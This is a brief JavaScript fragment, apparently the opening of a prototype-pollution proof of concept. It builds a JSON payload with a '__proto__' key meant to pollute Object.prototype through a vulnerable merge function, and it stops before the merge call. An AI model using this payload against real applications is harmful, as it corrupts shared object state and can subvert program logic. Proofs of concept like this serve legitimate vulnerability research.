async function exploit() {
  console.log('[*] Pre-check: ({}).exploited === undefined ?', ({}).exploited);

  // JSON.parse guarantees that "__proto__" is assigned as an explicit own property.
  // In the vulnerable code path, this bypasses standard object literal behavior 
  // and forces _merge to process it as a mergeable key.
  const payload = JSON.parse('{"__proto__": {"exploited": true}}');
  const target = {};

